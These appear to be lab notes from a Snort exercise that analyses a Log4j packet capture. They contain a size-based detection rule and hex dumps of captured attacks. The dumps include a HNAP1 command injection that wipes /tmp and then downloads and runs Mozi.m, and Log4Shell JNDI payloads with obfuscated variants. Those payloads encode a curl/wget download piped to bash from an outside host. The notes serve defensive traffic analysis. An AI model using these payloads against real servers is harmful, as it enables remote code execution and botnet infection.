# Log4j

```text
ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -c local.rules -dev -l . -r log4j.pcap
```

New ruleset:

```text
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.

alert tcp any any <> any any (msg:"Abnormal packet size detected"; dsize: 770<>855; sid: 100001; rev:1;)
```

```text
ubuntu@ip-10-10-234-43:~/Desktop/Exercise-Files/TASK-8 (Log4j)$ sudo snort -d -r snort.log.1669592367 -n 4
Exiting after 4 packets
Running in packet dump mode

        --== Initializing Snort ==--
Initializing Output Plugins!
pcap DAQ configured to read-file.
Acquiring network traffic from "snort.log.1669592367".

        --== Initialization Complete ==--

   ,,_     -*> Snort! <*-
  o"  )~   Version 2.9.7.0 GRE (Build 149) 
   ''''    By Martin Roesch & The Snort Team: http://www.snort.org/contact#team
           Copyright (C) 2014 Cisco and/or its affiliates. All rights reserved.
           Copyright (C) 1998-2013 Sourcefire, Inc., et al.
           Using libpcap version 1.9.1 (with TPACKET_V3)
           Using PCRE version: 8.39 2016-06-14
           Using ZLIB version: 1.2.11

Commencing packet processing (pid=3237)
WARNING: No preprocessors configured for policy 0.
12/11-11:01:34.486776 49.143.32.6:4788 -> 198.71.247.91:80
TCP TTL:49 TOS:0x0 ID:55286 IpLen:20 DgmLen:842
***AP*** Seq: 0x6C5341A2  Ack: 0x8A162B60  Win: 0xB68  TcpLen: 32
TCP Options (3) => NOP NOP TS: 956236 2733624246 
50 4F 53 54 20 2F 48 4E 41 50 31 2F 20 48 54 54  POST /HNAP1/ HTT
50 2F 31 2E 30 0D 0A 48 6F 73 74 3A 20 31 39 38  P/1.0..Host: 198
2E 37 31 2E 32 34 37 2E 39 31 3A 38 30 0D 0A 43  .71.247.91:80..C
6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 74 65 78  ontent-Type: tex
74 2F 78 6D 6C 3B 20 63 68 61 72 73 65 74 3D 22  t/xml; charset="
75 74 66 2D 38 22 0D 0A 53 4F 41 50 41 63 74 69  utf-8"..SOAPActi
6F 6E 3A 20 68 74 74 70 3A 2F 2F 70 75 72 65 6E  on: http://puren
65 74 77 6F 72 6B 73 2E 63 6F 6D 2F 48 4E 41 50  etworks.com/HNAP
31 2F 60 63 64 20 2F 74 6D 70 20 26 26 20 72 6D  1/`cd /tmp && rm
20 2D 72 66 20 2A 20 26 26 20 77 67 65 74 20 68   -rf * && wget h
74 74 70 3A 2F 2F 31 39 32 2E 31 36 38 2E 31 2E  ttp://192.168.1.
31 3A 38 30 38 38 2F 4D 6F 7A 69 2E 6D 20 26 26  1:8088/Mozi.m &&
20 63 68 6D 6F 64 20 37 37 37 20 2F 74 6D 70 2F   chmod 777 /tmp/
4D 6F 7A 69 2E 6D 20 26 26 20 2F 74 6D 70 2F 4D  Mozi.m && /tmp/M
6F 7A 69 2E 6D 60 0D 0A 43 6F 6E 74 65 6E 74 2D  ozi.m`..Content-
4C 65 6E 67 74 68 3A 20 36 34 30 0D 0A 0D 0A 3C  Length: 640....<
3F 78 6D 6C 20 76 65 72 73 69 6F 6E 3D 22 31 2E  ?xml version="1.
30 22 20 65 6E 63 6F 64 69 6E 67 3D 22 75 74 66  0" encoding="utf
2D 38 22 3F 3E 3C 73 6F 61 70 3A 45 6E 76 65 6C  -8"?><soap:Envel
6F 70 65 20 78 6D 6C 6E 73 3A 78 73 69 3D 22 68  ope xmlns:xsi="h
74 74 70 3A 2F 2F 77 77 77 2E 77 33 2E 6F 72 67  ttp://www.w3.org
2F 32 30 30 31 2F 58 4D 4C 53 63 68 65 6D 61 2D  /2001/XMLSchema-
69 6E 73 74 61 6E 63 65 22 20 78 6D 6C 6E 73 3A  instance" xmlns:
78 73 64 3D 22 68 74 74 70 3A 2F 2F 77 77 77 2E  xsd="http://www.
77 33 2E 6F 72 67 2F 32 30 30 31 2F 58 4D 4C 53  w3.org/2001/XMLS
63 68 65 6D 61 22 20 78 6D 6C 6E 73 3A 73 6F 61  chema" xmlns:soa
70 3D 22 68 74 74 70 3A 2F 2F 73 63 68 65 6D 61  p="http://schema
73 2E 78 6D 6C 73 6F 61 70 2E 6F 72 67 2F 73 6F  s.xmlsoap.org/so
61 70 2F 65 6E 76 65 6C 6F 70 65 2F 22 3E 3C 73  ap/envelope/"><s
6F 61 70 3A 42 6F 64 79 3E 3C 41 64 64 50 6F 72  oap:Body><AddPor
74 4D 61 70 70 69 6E 67 20 78 6D 6C 6E 73 3D 22  tMapping xmlns="
68 74 74 70 3A 2F 2F 70 75 72 65 6E 65 74 77 6F  http://purenetwo
72 6B 73 2E 63 6F 6D 2F 48 4E 41 50 31 2F 22 3E  rks.com/HNAP1/">
3C 50 6F 72 74 4D 61 70 70 69 6E 67 44 65 73 63  <PortMappingDesc
72 69 70 74 69 6F 6E 3E 66 6F 6F 62 61 72 3C 2F  ription>foobar</
50 6F 72 74 4D 61 70 70 69 6E 67 44 65 73 63 72  PortMappingDescr
69 70 74 69 6F 6E 3E 3C 49 6E 74 65 72 6E 61 6C  iption><Internal
43 6C 69 65 6E 74 3E 31 39 32 2E 31 36 38 2E 30  Client>192.168.0
2E 31 30 30 3C 2F 49 6E 74 65 72 6E 61 6C 43 6C  .100</InternalCl
69 65 6E 74 3E 3C 50 6F 72 74 4D 61 70 70 69 6E  ient><PortMappin
67 50 72 6F 74 6F 63 6F 6C 3E 54 43 50 3C 2F 50  gProtocol>TCP</P
6F 72 74 4D 61 70 70 69 6E 67 50 72 6F 74 6F 63  ortMappingProtoc
6F 6C 3E 3C 45 78 74 65 72 6E 61 6C 50 6F 72 74  ol><ExternalPort
3E 31 32 33 34 3C 2F 45 78 74 65 72 6E 61 6C 50  >1234</ExternalP
6F 72 74 3E 3C 49 6E 74 65 72 6E 61 6C 50 6F 72  ort><InternalPor
74 3E 31 32 33 34 3C 2F 49 6E 74 65 72 6E 61 6C  t>1234</Internal
50 6F 72 74 3E 3C 2F 41 64 64 50 6F 72 74 4D 61  Port></AddPortMa
70 70 69 6E 67 3E 3C 2F 73 6F 61 70 3A 42 6F 64  pping></soap:Bod
79 3E 3C 2F 73 6F 61 70 3A 45 6E 76 65 6C 6F 70  y></soap:Envelop
65 3E 0D 0A 0D 0A                                e>....

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+
...
...
=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
12/12-05:06:07.579734 45.155.205.233:39692 -> 198.71.247.91:80
TCP TTL:53 TOS:0x0 ID:62808 IpLen:20 DgmLen:827
***AP*** Seq: 0xDC9A621B  Ack: 0x9B92AFC8  Win: 0x1F6  TcpLen: 32
TCP Options (3) => NOP NOP TS: 1584792788 1670627000 
47 45 54 20 2F 3F 78 3D 24 7B 6A 6E 64 69 3A 6C  GET /?x=${jndi:l
64 61 70 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35  dap://45.155.205
2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63  .233:12344/Basic
2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F  /Command/Base64/
4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75  KGN1cmwgLXMgNDUu
4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36  MTU1LjIwNS4yMzM6
4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79  NTg3NC8xNjIuMC4y
4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33  MjguMjUzOjgwfHx3
5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30  Z2V0IC1xIC1PLSA0
4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A  NS4xNTUuMjA1LjIz
4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77  Mzo1ODc0LzE2Mi4w
4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70  LjIyOC4yNTM6ODAp
66 47 4A 68 63 32 67 3D 7D 20 48 54 54 50 2F 31  fGJhc2g=} HTTP/1
2E 31 0D 0A 48 6F 73 74 3A 20 31 39 38 2E 37 31  .1..Host: 198.71
2E 32 34 37 2E 39 31 3A 38 30 0D 0A 55 73 65 72  .247.91:80..User
2D 41 67 65 6E 74 3A 20 24 7B 24 7B 3A 3A 2D 6A  -Agent: ${${::-j
7D 24 7B 3A 3A 2D 6E 7D 24 7B 3A 3A 2D 64 7D 24  }${::-n}${::-d}$
7B 3A 3A 2D 69 7D 3A 24 7B 3A 3A 2D 6C 7D 24 7B  {::-i}:${::-l}${
3A 3A 2D 64 7D 24 7B 3A 3A 2D 61 7D 24 7B 3A 3A  ::-d}${::-a}${::
2D 70 7D 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35  -p}://45.155.205
2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63  .233:12344/Basic
2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F  /Command/Base64/
4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75  KGN1cmwgLXMgNDUu
4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36  MTU1LjIwNS4yMzM6
4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79  NTg3NC8xNjIuMC4y
4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33  MjguMjUzOjgwfHx3
5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30  Z2V0IC1xIC1PLSA0
4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A  NS4xNTUuMjA1LjIz
4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77  Mzo1ODc0LzE2Mi4w
4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70  LjIyOC4yNTM6ODAp
66 47 4A 68 63 32 67 3D 7D 0D 0A 52 65 66 65 72  fGJhc2g=}..Refer
65 72 3A 20 24 7B 6A 6E 64 69 3A 24 7B 6C 6F 77  er: ${jndi:${low
65 72 3A 6C 7D 24 7B 6C 6F 77 65 72 3A 64 7D 24  er:l}${lower:d}$
7B 6C 6F 77 65 72 3A 61 7D 24 7B 6C 6F 77 65 72  {lower:a}${lower
3A 70 7D 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35  :p}://45.155.205
2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63  .233:12344/Basic
2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F  /Command/Base64/
4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75  KGN1cmwgLXMgNDUu
4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36  MTU1LjIwNS4yMzM6
4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79  NTg3NC8xNjIuMC4y
4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33  MjguMjUzOjgwfHx3
5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30  Z2V0IC1xIC1PLSA0
4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A  NS4xNTUuMjA1LjIz
4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77  Mzo1ODc0LzE2Mi4w
4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70  LjIyOC4yNTM6ODAp
66 47 4A 68 63 32 67 3D 7D 0D 0A 41 63 63 65 70  fGJhc2g=}..Accep
74 2D 45 6E 63 6F 64 69 6E 67 3A 20 67 7A 69 70  t-Encoding: gzip
0D 0A 43 6F 6E 6E 65 63 74 69 6F 6E 3A 20 63 6C  ..Connection: cl
6F 73 65 0D 0A 0D 0A                             ose....

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
12/12-23:04:16.733905 172.16.4.58:80 -> 154.65.28.250:57932
TCP TTL:64 TOS:0x0 ID:48813 IpLen:20 DgmLen:854 DF
***AP*** Seq: 0x48D46381  Ack: 0x22A6C128  Win: 0x1FC  TcpLen: 32
TCP Options (3) => NOP NOP TS: 624333714 2274436091 
48 54 54 50 2F 31 2E 31 20 32 30 30 20 4F 4B 0D  HTTP/1.1 200 OK.
0A 44 61 74 65 3A 20 53 75 6E 2C 20 31 32 20 44  .Date: Sun, 12 D
65 63 20 32 30 32 31 20 32 33 3A 30 34 3A 31 36  ec 2021 23:04:16
20 47 4D 54 0D 0A 53 65 72 76 65 72 3A 20 41 70   GMT..Server: Ap
61 63 68 65 2F 32 2E 34 2E 32 39 20 28 55 62 75  ache/2.4.29 (Ubu
6E 74 75 29 0D 0A 4C 61 73 74 2D 4D 6F 64 69 66  ntu)..Last-Modif
69 65 64 3A 20 57 65 64 2C 20 30 38 20 4A 61 6E  ied: Wed, 08 Jan
20 32 30 32 30 20 31 38 3A 33 39 3A 34 37 20 47   2020 18:39:47 G
4D 54 0D 0A 45 54 61 67 3A 20 22 32 32 36 2D 35  MT..ETag: "226-5
39 62 61 35 33 37 38 38 64 37 61 62 22 0D 0A 41  9ba53788d7ab"..A
63 63 65 70 74 2D 52 61 6E 67 65 73 3A 20 62 79  ccept-Ranges: by
74 65 73 0D 0A 43 6F 6E 74 65 6E 74 2D 4C 65 6E  tes..Content-Len
67 74 68 3A 20 35 35 30 0D 0A 56 61 72 79 3A 20  gth: 550..Vary: 
41 63 63 65 70 74 2D 45 6E 63 6F 64 69 6E 67 0D  Accept-Encoding.
0A 43 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 74  .Content-Type: t
65 78 74 2F 68 74 6D 6C 0D 0A 0D 0A 3C 21 44 4F  ext/html....<!DO
43 54 59 50 45 20 68 74 6D 6C 3E 0A 3C 68 74 6D  CTYPE html>.<htm
6C 3E 0A 20 20 3C 68 65 61 64 3E 0A 20 20 20 20  l>.  <head>.    
3C 6D 65 74 61 20 63 68 61 72 73 65 74 3D 22 55  <meta charset="U
54 46 2D 38 22 3E 0A 20 20 20 20 3C 6D 65 74 61  TF-8">.    <meta
20 68 74 74 70 2D 65 71 75 69 76 3D 22 72 65 66   http-equiv="ref
72 65 73 68 22 20 63 6F 6E 74 65 6E 74 3D 22 30  resh" content="0
3B 55 52 4C 3D 27 68 74 74 70 73 3A 2F 2F 77 77  ;URL='https://ww
77 2E 67 6F 6F 67 6C 65 2E 63 6F 6D 2F 27 22 20  w.google.com/'" 
2F 3E 0A 20 20 20 20 3C 74 69 74 6C 65 3E 74 69  />.    <title>ti
74 6C 65 3C 2F 74 69 74 6C 65 3E 0A 20 20 3C 2F  tle</title>.  </
68 65 61 64 3E 0A 20 20 3C 62 6F 64 79 3E 0A 20  head>.  <body>. 
20 0A 20 20 3C 73 63 72 69 70 74 20 74 79 70 65   .  <script type
3D 22 74 65 78 74 2F 6A 61 76 61 73 63 72 69 70  ="text/javascrip
74 22 3E 0A 20 20 20 66 75 6E 63 74 69 6F 6E 20  t">.   function 
61 75 74 6F 72 75 6E 28 29 0A 20 20 20 7B 0A 20  autorun().   {. 
20 20 20 77 69 6E 64 6F 77 2E 6C 6F 63 61 74 69     window.locati
6F 6E 2E 72 65 70 6C 61 63 65 28 22 68 74 74 70  on.replace("http
73 3A 2F 2F 77 77 77 2E 67 6F 6F 67 6C 65 2E 63  s://www.google.c
6F 6D 22 29 3B 0A 20 20 20 7D 0A 20 20 20 69 66  om");.   }.   if
20 28 64 6F 63 75 6D 65 6E 74 2E 61 64 64 45 76   (document.addEv
65 6E 74 4C 69 73 74 65 6E 65 72 29 20 64 6F 63  entListener) doc
75 6D 65 6E 74 2E 61 64 64 45 76 65 6E 74 4C 69  ument.addEventLi
73 74 65 6E 65 72 28 22 44 4F 4D 43 6F 6E 74 65  stener("DOMConte
6E 74 4C 6F 61 64 65 64 22 2C 20 61 75 74 6F 72  ntLoaded", autor
75 6E 2C 20 66 61 6C 73 65 29 3B 0A 20 20 20 65  un, false);.   e
6C 73 65 20 69 66 20 28 64 6F 63 75 6D 65 6E 74  lse if (document
2E 61 74 74 61 63 68 45 76 65 6E 74 29 20 64 6F  .attachEvent) do
63 75 6D 65 6E 74 2E 61 74 74 61 63 68 45 76 65  cument.attachEve
6E 74 28 22 6F 6E 72 65 61 64 79 73 74 61 74 65  nt("onreadystate
63 68 61 6E 67 65 22 2C 20 61 75 74 6F 72 75 6E  change", autorun
29 3B 0A 20 20 20 65 6C 73 65 20 77 69 6E 64 6F  );.   else windo
77 2E 6F 6E 6C 6F 61 64 20 3D 20 61 75 74 6F 72  w.onload = autor
75 6E 3B 0A 20 20 3C 2F 73 63 72 69 70 74 3E 0A  un;.  </script>.
20 20 3C 2F 62 6F 64 79 3E 0A 3C 2F 68 74 6D 6C    </body>.</html
3E 0A                                            >.

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
12/12-05:06:07.579734 45.155.205.233:39692 -> 198.71.247.91:80
TCP TTL:53 TOS:0x0 ID:62808 IpLen:20 DgmLen:827
***AP*** Seq: 0xDC9A621B  Ack: 0x9B92AFC8  Win: 0x1F6  TcpLen: 32
TCP Options (3) => NOP NOP TS: 1584792788 1670627000 
47 45 54 20 2F 3F 78 3D 24 7B 6A 6E 64 69 3A 6C  GET /?x=${jndi:l
64 61 70 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35  dap://45.155.205
2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63  .233:12344/Basic
2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F  /Command/Base64/
4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75  KGN1cmwgLXMgNDUu
4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36  MTU1LjIwNS4yMzM6
4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79  NTg3NC8xNjIuMC4y
4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33  MjguMjUzOjgwfHx3
5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30  Z2V0IC1xIC1PLSA0
4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A  NS4xNTUuMjA1LjIz
4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77  Mzo1ODc0LzE2Mi4w
4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70  LjIyOC4yNTM6ODAp
66 47 4A 68 63 32 67 3D 7D 20 48 54 54 50 2F 31  fGJhc2g=} HTTP/1
2E 31 0D 0A 48 6F 73 74 3A 20 31 39 38 2E 37 31  .1..Host: 198.71
2E 32 34 37 2E 39 31 3A 38 30 0D 0A 55 73 65 72  .247.91:80..User
2D 41 67 65 6E 74 3A 20 24 7B 24 7B 3A 3A 2D 6A  -Agent: ${${::-j
7D 24 7B 3A 3A 2D 6E 7D 24 7B 3A 3A 2D 64 7D 24  }${::-n}${::-d}$
7B 3A 3A 2D 69 7D 3A 24 7B 3A 3A 2D 6C 7D 24 7B  {::-i}:${::-l}${
3A 3A 2D 64 7D 24 7B 3A 3A 2D 61 7D 24 7B 3A 3A  ::-d}${::-a}${::
2D 70 7D 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35  -p}://45.155.205
2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63  .233:12344/Basic
2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F  /Command/Base64/
4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75  KGN1cmwgLXMgNDUu
4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36  MTU1LjIwNS4yMzM6
4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79  NTg3NC8xNjIuMC4y
4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33  MjguMjUzOjgwfHx3
5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30  Z2V0IC1xIC1PLSA0
4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A  NS4xNTUuMjA1LjIz
4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77  Mzo1ODc0LzE2Mi4w
4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70  LjIyOC4yNTM6ODAp
66 47 4A 68 63 32 67 3D 7D 0D 0A 52 65 66 65 72  fGJhc2g=}..Refer
65 72 3A 20 24 7B 6A 6E 64 69 3A 24 7B 6C 6F 77  er: ${jndi:${low
65 72 3A 6C 7D 24 7B 6C 6F 77 65 72 3A 64 7D 24  er:l}${lower:d}$
7B 6C 6F 77 65 72 3A 61 7D 24 7B 6C 6F 77 65 72  {lower:a}${lower
3A 70 7D 3A 2F 2F 34 35 2E 31 35 35 2E 32 30 35  :p}://45.155.205
2E 32 33 33 3A 31 32 33 34 34 2F 42 61 73 69 63  .233:12344/Basic
2F 43 6F 6D 6D 61 6E 64 2F 42 61 73 65 36 34 2F  /Command/Base64/
4B 47 4E 31 63 6D 77 67 4C 58 4D 67 4E 44 55 75  KGN1cmwgLXMgNDUu
4D 54 55 31 4C 6A 49 77 4E 53 34 79 4D 7A 4D 36  MTU1LjIwNS4yMzM6
4E 54 67 33 4E 43 38 78 4E 6A 49 75 4D 43 34 79  NTg3NC8xNjIuMC4y
4D 6A 67 75 4D 6A 55 7A 4F 6A 67 77 66 48 78 33  MjguMjUzOjgwfHx3
5A 32 56 30 49 43 31 78 49 43 31 50 4C 53 41 30  Z2V0IC1xIC1PLSA0
4E 53 34 78 4E 54 55 75 4D 6A 41 31 4C 6A 49 7A  NS4xNTUuMjA1LjIz
4D 7A 6F 31 4F 44 63 30 4C 7A 45 32 4D 69 34 77  Mzo1ODc0LzE2Mi4w
4C 6A 49 79 4F 43 34 79 4E 54 4D 36 4F 44 41 70  LjIyOC4yNTM6ODAp
66 47 4A 68 63 32 67 3D 7D 0D 0A 41 63 63 65 70  fGJhc2g=}..Accep
74 2D 45 6E 63 6F 64 69 6E 67 3A 20 67 7A 69 70  t-Encoding: gzip
0D 0A 43 6F 6E 6E 65 63 74 69 6F 6E 3A 20 63 6C  ..Connection: cl
6F 73 65 0D 0A 0D 0A                             ose....

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

WARNING: No preprocessors configured for policy 0.
12/12-23:04:16.733905 172.16.4.58:80 -> 154.65.28.250:57932
TCP TTL:64 TOS:0x0 ID:48813 IpLen:20 DgmLen:854 DF
***AP*** Seq: 0x48D46381  Ack: 0x22A6C128  Win: 0x1FC  TcpLen: 32
TCP Options (3) => NOP NOP TS: 624333714 2274436091 
48 54 54 50 2F 31 2E 31 20 32 30 30 20 4F 4B 0D  HTTP/1.1 200 OK.
0A 44 61 74 65 3A 20 53 75 6E 2C 20 31 32 20 44  .Date: Sun, 12 D
65 63 20 32 30 32 31 20 32 33 3A 30 34 3A 31 36  ec 2021 23:04:16
20 47 4D 54 0D 0A 53 65 72 76 65 72 3A 20 41 70   GMT..Server: Ap
61 63 68 65 2F 32 2E 34 2E 32 39 20 28 55 62 75  ache/2.4.29 (Ubu
6E 74 75 29 0D 0A 4C 61 73 74 2D 4D 6F 64 69 66  ntu)..Last-Modif
69 65 64 3A 20 57 65 64 2C 20 30 38 20 4A 61 6E  ied: Wed, 08 Jan
20 32 30 32 30 20 31 38 3A 33 39 3A 34 37 20 47   2020 18:39:47 G
4D 54 0D 0A 45 54 61 67 3A 20 22 32 32 36 2D 35  MT..ETag: "226-5
39 62 61 35 33 37 38 38 64 37 61 62 22 0D 0A 41  9ba53788d7ab"..A
63 63 65 70 74 2D 52 61 6E 67 65 73 3A 20 62 79  ccept-Ranges: by
74 65 73 0D 0A 43 6F 6E 74 65 6E 74 2D 4C 65 6E  tes..Content-Len
67 74 68 3A 20 35 35 30 0D 0A 56 61 72 79 3A 20  gth: 550..Vary: 
41 63 63 65 70 74 2D 45 6E 63 6F 64 69 6E 67 0D  Accept-Encoding.
0A 43 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 74  .Content-Type: t
65 78 74 2F 68 74 6D 6C 0D 0A 0D 0A 3C 21 44 4F  ext/html....<!DO
43 54 59 50 45 20 68 74 6D 6C 3E 0A 3C 68 74 6D  CTYPE html>.<htm
6C 3E 0A 20 20 3C 68 65 61 64 3E 0A 20 20 20 20  l>.  <head>.    
3C 6D 65 74 61 20 63 68 61 72 73 65 74 3D 22 55  <meta charset="U
54 46 2D 38 22 3E 0A 20 20 20 20 3C 6D 65 74 61  TF-8">.    <meta
20 68 74 74 70 2D 65 71 75 69 76 3D 22 72 65 66   http-equiv="ref
72 65 73 68 22 20 63 6F 6E 74 65 6E 74 3D 22 30  resh" content="0
3B 55 52 4C 3D 27 68 74 74 70 73 3A 2F 2F 77 77  ;URL='https://ww
77 2E 67 6F 6F 67 6C 65 2E 63 6F 6D 2F 27 22 20  w.google.com/'" 
2F 3E 0A 20 20 20 20 3C 74 69 74 6C 65 3E 74 69  />.    <title>ti
74 6C 65 3C 2F 74 69 74 6C 65 3E 0A 20 20 3C 2F  tle</title>.  </
68 65 61 64 3E 0A 20 20 3C 62 6F 64 79 3E 0A 20  head>.  <body>. 
20 0A 20 20 3C 73 63 72 69 70 74 20 74 79 70 65   .  <script type
3D 22 74 65 78 74 2F 6A 61 76 61 73 63 72 69 70  ="text/javascrip
74 22 3E 0A 20 20 20 66 75 6E 63 74 69 6F 6E 20  t">.   function 
61 75 74 6F 72 75 6E 28 29 0A 20 20 20 7B 0A 20  autorun().   {. 
20 20 20 77 69 6E 64 6F 77 2E 6C 6F 63 61 74 69     window.locati
6F 6E 2E 72 65 70 6C 61 63 65 28 22 68 74 74 70  on.replace("http
73 3A 2F 2F 77 77 77 2E 67 6F 6F 67 6C 65 2E 63  s://www.google.c
6F 6D 22 29 3B 0A 20 20 20 7D 0A 20 20 20 69 66  om");.   }.   if
20 28 64 6F 63 75 6D 65 6E 74 2E 61 64 64 45 76   (document.addEv
65 6E 74 4C 69 73 74 65 6E 65 72 29 20 64 6F 63  entListener) doc
75 6D 65 6E 74 2E 61 64 64 45 76 65 6E 74 4C 69  ument.addEventLi
73 74 65 6E 65 72 28 22 44 4F 4D 43 6F 6E 74 65  stener("DOMConte
6E 74 4C 6F 61 64 65 64 22 2C 20 61 75 74 6F 72  ntLoaded", autor
75 6E 2C 20 66 61 6C 73 65 29 3B 0A 20 20 20 65  un, false);.   e
6C 73 65 20 69 66 20 28 64 6F 63 75 6D 65 6E 74  lse if (document
2E 61 74 74 61 63 68 45 76 65 6E 74 29 20 64 6F  .attachEvent) do
63 75 6D 65 6E 74 2E 61 74 74 61 63 68 45 76 65  cument.attachEve
6E 74 28 22 6F 6E 72 65 61 64 79 73 74 61 74 65  nt("onreadystate
63 68 61 6E 67 65 22 2C 20 61 75 74 6F 72 75 6E  change", autorun
29 3B 0A 20 20 20 65 6C 73 65 20 77 69 6E 64 6F  );.   else windo
77 2E 6F 6E 6C 6F 61 64 20 3D 20 61 75 74 6F 72  w.onload = autor
75 6E 3B 0A 20 20 3C 2F 73 63 72 69 70 74 3E 0A  un;.  </script>.
20 20 3C 2F 62 6F 64 79 3E 0A 3C 2F 68 74 6D 6C    </body>.</html
3E 0A                                            >.

=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+

===============================================================================
Run time for packet processing was 0.7059 seconds
Snort processed 41 packets.
Snort ran for 0 days 0 hours 0 minutes 0 seconds
   Pkts/sec:           41
===============================================================================
```

Command: 

`KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8xNjIuMC4yMjguMjUzOjgwfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzE2Mi4wLjIyOC4yNTM6ODApfGJhc2g=}`

Base64 decode and done.